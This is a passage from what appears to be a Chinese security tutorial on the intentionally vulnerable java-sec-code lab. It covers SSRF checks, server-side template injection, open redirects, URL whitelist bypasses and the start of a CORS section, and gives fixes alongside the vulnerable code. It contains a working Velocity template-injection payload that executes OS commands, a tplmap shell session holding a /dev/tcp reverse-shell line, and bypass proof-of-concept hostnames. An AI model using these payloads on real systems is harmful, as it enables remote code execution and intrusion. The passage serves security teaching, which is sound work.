class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    static boolean isInternalIp(String strIP) &#123;</span><br><span class="line">        if (StringUtils.isEmpty(strIP)) &#123;</span><br><span class="line">            logger.error(&quot;[-] SSRF check failed. IP is empty. &quot; + strIP);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; blackSubnets &#x3D; WebConfig.getSsrfBlockIps();</span><br><span class="line">        for (String subnet : blackSubnets) &#123;</span><br><span class="line">            SubnetUtils utils &#x3D; new SubnetUtils(subnet);</span><br><span class="line">            if (utils.getInfo().isInRange(strIP)) &#123;</span><br><span class="line">                logger.error(&quot;[-] SSRF check failed. Internal IP: &quot; + strIP);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">     *</span><br><span class="line">     * @param host 域名host</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String host2ip(String host) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            InetAddress IpAddress &#x3D; InetAddress.getByName(host); &#x2F;&#x2F;  send dns request</span><br><span class="line">            return IpAddress.getHostAddress();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">     *</span><br><span class="line">     * @param url http的url</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String url2host(String url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 使用URI，而非URL，防止被绕过。</span><br><span class="line">            URI u &#x3D; new URI(url);</span><br><span class="line">            if (SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return u.getHost();</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="15-SSTI"><a href="#15-SSTI" class="headerlink" title="15.SSTI"></a>15.SSTI</h2><blockquote>
<p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.16:8080&#x2F;java_sec_code_war&#x2F;ssti&#x2F;velocity?template&#x3D;%23set($e&#x3D;%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png" alt="image-20211027143734728"></p>
<p>也可以使用<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap来验证">https://github.com/epinna/tplmap来验证</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br><span class="line">python tplmap.py --os-shell -u &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;ssti&#x2F;velocity?template&#x3D;aa&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Testing if GET parameter &#39;template&#39; is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Twig plugin is testing blind injection</span><br><span class="line">[+] Freemarker plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Freemarker plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Velocity plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin has confirmed blind injection</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: template</span><br><span class="line">  Engine: Velocity</span><br><span class="line">  Injection: *</span><br><span class="line">  Context: text</span><br><span class="line">  OS: undetected</span><br><span class="line">  Technique: blind</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok (blind)</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok (blind)</span><br><span class="line">   File read: no</span><br><span class="line">   Code evaluation: no</span><br><span class="line"></span><br><span class="line">[+] Blind injection has been found and command execution will not produce any output.</span><br><span class="line">[+] Delay is introduced appending &#39;&amp;&amp; sleep &lt;delay&gt;&#39; to the shell commands. True or False is returned whether it returns successfully or not.</span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"> (blind) $ id</span><br><span class="line">True</span><br><span class="line"> (blind) $ whoami</span><br><span class="line">True</span><br><span class="line"> (blind) $ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;reverse_ip&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>修复意见：</p>
<p>针对于不同的模板引擎，该漏洞的修复方法会有所不同，但如果在传递给模板指令之前，对用户输入进行安全过滤的话，则可以大大减少这类威胁。此外，另一种防御方法是使用沙箱环境，将危险的指令删除/禁用，或者对系统环境进行安全加固。</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心</a></li>
</ol>
<h2 id="16-URLRedirect"><a href="#16-URLRedirect" class="headerlink" title="16.URLRedirect"></a>16.URLRedirect</h2><p>url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼。</p>
<p>url跳转常见的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 登陆跳转我认为是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</span><br><span class="line">2. 用户分享、收藏内容过后，会跳转</span><br><span class="line">3. 跨站点认证、授权后，会跳转</span><br><span class="line">4. 站内点击其它网址链接时，会跳转</span><br><span class="line">5. 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</span><br><span class="line">6. 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</span><br></pre></td></tr></table></figure>

<p>url跳转常用到的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect</span><br><span class="line">url</span><br><span class="line">redirectUrl</span><br><span class="line">callback</span><br><span class="line">return_url</span><br><span class="line">toUrl</span><br><span class="line">ReturnUrl</span><br><span class="line">fromUrl</span><br><span class="line">redUrl</span><br><span class="line">request</span><br><span class="line">redirect_to</span><br><span class="line">redirect_url</span><br><span class="line">jump</span><br><span class="line">jump_to</span><br><span class="line">target</span><br><span class="line">to</span><br><span class="line">goto</span><br><span class="line">link</span><br><span class="line">linkto</span><br><span class="line">domain</span><br><span class="line">oauth_callback</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<p>重定向跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>301跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;setHeader&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); &#x2F;&#x2F; 301 redirect</span><br><span class="line">    response.setHeader(&quot;Location&quot;, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>302跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;sendRedirect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.sendRedirect(url); &#x2F;&#x2F; 302 redirect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复方式：</p>
<p>只能内部跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;forward&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void forward(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    RequestDispatcher rd &#x3D; request.getRequestDispatcher(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        rd.forward(request, response);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过checkURL去检查输入的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(&quot;&#x2F;sendRedirect&#x2F;sec&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">        if (SecurityUtil.checkURL(url) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(&quot;url forbidden&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 同时支持一级域名和多级域名，相关配置在resources目录下url&#x2F;url_safe_domain.xml文件。</span><br><span class="line"> * 优先判断黑名单，如果满足黑名单return null。</span><br><span class="line"> *</span><br><span class="line"> * @param url the url need to check</span><br><span class="line"> * @return Safe url returns original url; Illegal url returns null;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public static String checkURL(String url) &#123;</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; url)&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; safeDomains &#x3D; WebConfig.getSafeDomains();</span><br><span class="line">    ArrayList&lt;String&gt; blockDomains &#x3D; WebConfig.getBlockDomains();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String host &#x3D; gethost(url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">        if (!isHttp(url)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果满足黑名单返回null</span><br><span class="line">        if (blockDomains.contains(host))&#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        for(String blockDomain: blockDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + blockDomain)) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持多级域名</span><br><span class="line">        if (safeDomains.contains(host))&#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持一级域名</span><br><span class="line">        for(String safedomain: safeDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + safedomain)) &#123;</span><br><span class="line">                return url;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; catch (NullPointerException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测相关url是否在自己配置中，若不在则返回NULL</p>
<h2 id="17-URLWhiteList"><a href="#17-URLWhiteList" class="headerlink" title="17.URLWhiteList"></a>17.URLWhiteList</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote>
<blockquote>
<p>安全工程师：接口需要验证参数中的URL是否是内部域名。<br>开发工程师：好的，没问题。</p>
</blockquote>
</blockquote>
<p>如果不使用已经写好的安全框架，真正让开发去添加一个URL白名单，我相信不少人会出现不同程度的安全问题。</p>
<p>所以，我觉得有必要单独拿出来简单说下这个问题。</p>
<h3 id="2-可造成的漏洞"><a href="#2-可造成的漏洞" class="headerlink" title="2.可造成的漏洞"></a>2.可造成的漏洞</h3><p>和URL有关系的漏洞，我们可以联想到包括但不局限于下面的漏洞</p>
<ul>
<li>CSRF</li>
<li>JSONP</li>
<li>SSRF</li>
<li>URL跳转</li>
<li>绕过CORS(跨域资源分享)</li>
</ul>
<h3 id="3-Bypass-Poc及实际案例"><a href="#3-Bypass-Poc及实际案例" class="headerlink" title="3.Bypass Poc及实际案例"></a>3.Bypass Poc及实际案例</h3><p>先来看一下应该如何安全验证：</p>
<p>先来看下应该如何安全验证：</p>
<ul>
<li>取一级域名</li>
<li>判断一级域名是否在白名单里</li>
</ul>
<p>但是，在实际的甲方安全中，很多开发者会犯以下的一些错误。</p>
<h4 id="1-endsWith"><a href="#1-endsWith" class="headerlink" title="1.endsWith"></a>1.endsWith</h4><p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure>

<p>案例：<br>飞猪做referer校验的时候，全站存在referer校验bypass问题，导致全站存在Json Hijack等漏洞，可以拿到飞猪的开房记录等信息。目前漏洞已经修复。</p>
<p>绕过的poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.joychoualitrip.com&#x2F;mytrip&#x2F;</span><br></pre></td></tr></table></figure>

<p>针对JSONP，这里提一个比较有趣的问题。有的接口返回是JSON，非JSONP的格式，但是由于开发者写了一个callback参数（但是流量里并未出现）。所以在自动动扫描漏洞时，扫描器可加上<code>callback、cback</code>等参数，可能会有意想不到的收获。</p>
<p>比如：<code>http://www.alitrip.com/order?id=1</code>返回JSON格式，所以并不存在JSON劫持。但是访问<code>http://www.alitrip.com/order?id=1&amp;callback=xxx</code>可能就会返回JSONP格式，从而可能存在JSON劫持漏洞。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;endsWith&quot;)</span><br><span class="line"> public String endsWith(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">     String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">     for (String domain : domainwhitelist) &#123;</span><br><span class="line">         if (host.endsWith(domain)) &#123;</span><br><span class="line">             return &quot;Good url.&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return &quot;Bad url.&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;endsWith?url&#x3D;http:&#x2F;&#x2F;aaajoychou.org</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png" alt="image-20211027151121258"></p>
<h4 id="2-contains"><a href="#2-contains" class="headerlink" title="2.contains"></a>2.contains</h4><p>取出一级域名。判断一级域名在白名单列表里使用contains判断</p>
<p>Bypass POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.com.bypass.com</span><br><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;contains&quot;)</span><br><span class="line">public String contains(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String domain : domainwhitelist) &#123;</span><br><span class="line">        if (host.contains(domain)) &#123;</span><br><span class="line">            return &quot;Good url.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;contains?url&#x3D;http:&#x2F;&#x2F;joychou.org.bypass.com</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png" alt="image-20211027151454711"></p>
<h4 id="3-statsWith"><a href="#3-statsWith" class="headerlink" title="3.statsWith"></a>3.statsWith</h4><p>取出一级域名，判断一级域名在白名单列表里使用<code>startsWith</code>判断</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.combypass</span><br></pre></td></tr></table></figure>

<p>这种域名后缀虽然不存在，造成无法利用。但是在实际的测试中，确实发现某大公司是以这样的方式写的代码。所以说，如果没有规范，什么样的逻辑代码都能写出来。</p>
<h4 id="4-正则表达式"><a href="#4-正则表达式" class="headerlink" title="4.正则表达式"></a>4.正则表达式</h4><p>用正则表达式去匹配URL中是否存在<code>www.joychou.com</code>字符串<br>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com.bypass.com</span><br></pre></td></tr></table></figure>

<p>还有的URL接口验证是否是图片链接，但是验证的方式居然是用正则匹配是否以类似<code>.800*600.</code>结尾。</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com&#x2F;_4528x2020.php</span><br></pre></td></tr></table></figure>

<p>用正则判断host是否是域名</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.10.xip.io</span><br></pre></td></tr></table></figure>

<p>案例：<br>腾讯某域名诊断功能存在SSRF（目前该漏洞已经修复）。<br>该功能验证逻辑，首先判断host是否是域名。</p>
<p>所以我们可以利用<code>xip.io</code>进行Bypass。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;regex&quot;)</span><br><span class="line">public String regex(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line">    Pattern p &#x3D; Pattern.compile(&quot;joychouorg&quot;);</span><br><span class="line">    Matcher m &#x3D; p.matcher(host);</span><br><span class="line"></span><br><span class="line">    if (m.find()) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;Bad url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png" alt="image-20211027151840814"></p>
<h4 id="5-正则匹配URL是否以-joychou-com"><a href="#5-正则匹配URL是否以-joychou-com" class="headerlink" title="5.正则匹配URL是否以.joychou.com"></a>5.正则匹配URL是否以.joychou.com</h4><p>正则为<code>.*\\.joychou.com$</code>的情况，之前的这两种<code>xxx.xxxjoychou.com</code>和<code>xxx.joychou.com.xxx</code>都不能绕过了。</p>
<p>Bypass Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.baidu.com&#x2F;?xxx.joychou.com</span><br></pre></td></tr></table></figure>

<h3 id="4-安全代码和测试环境"><a href="#4-安全代码和测试环境" class="headerlink" title="4.安全代码和测试环境"></a>4.安全代码和测试环境</h3><p>安全代码逻辑很简单：</p>
<ul>
<li>取一级域名</li>
<li>判断一级域名是否在白名单里。</li>
</ul>
<p>方法调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] urlwhitelist = &#123;<span class="string">&quot;joychou.com&quot;</span>, <span class="string">&quot;joychou.me&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>方法代码：</p>
<p>需要先添加guava库（目的是获取一级域名）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;sec&quot;)</span><br><span class="line">public String sec(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String whiteDomainlists[] &#x3D; &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String whiteHost: whiteDomainlists)&#123;</span><br><span class="line">        if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125; else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;array_indexOf&quot;)</span><br><span class="line">public String sec_array_indexOf(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Define muti-level host whitelist.</span><br><span class="line">    ArrayList&lt;String&gt; whiteDomainlists &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    whiteDomainlists.add(&quot;bbb.joychou.org&quot;);</span><br><span class="line">    whiteDomainlists.add(&quot;ccc.bbb.joychou.org&quot;);</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    if (whiteDomainlists.indexOf(host) !&#x3D; -1) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-CORS绕过"><a href="#5-CORS绕过" class="headerlink" title="5.CORS绕过"></a>5.CORS绕过</h3><p>先来看看<code>Access-Control-Allow-Origin</code>的使用。一般有两种方式设置该值：</p>
<ul>
<li>后端代码设置</li>
<li>Nginx等Web服务器设置</li>
</ul>
<p>域名设置<code>test.joychou.org</code>如下，表示该域名只接受来自<code>http://blacktech.com</code>的请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header  Access-Control-Allow-Origin &#39;http:&#x2F;&#x2F;blacktech.com&#39;;</span><br></pre></td></tr></table></figure>

<p>本地写一份请求<code>test.joychou.org</code>的代码，保存为1.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">        type: &#39;GET&#39;,</span><br><span class="line">        url: &#39;http:&#x2F;&#x2F;test.joychou.org&#39;,</span><br><span class="line">        success: function (data) &#123;</span><br><span class="line">            alert(data);</span><br><span class="line">            console.log(&#39;Yeah! Load Success.&#39;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (error) &#123;</span><br><span class="line">            alert(&#39;Oh,no! Load Failed.&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span 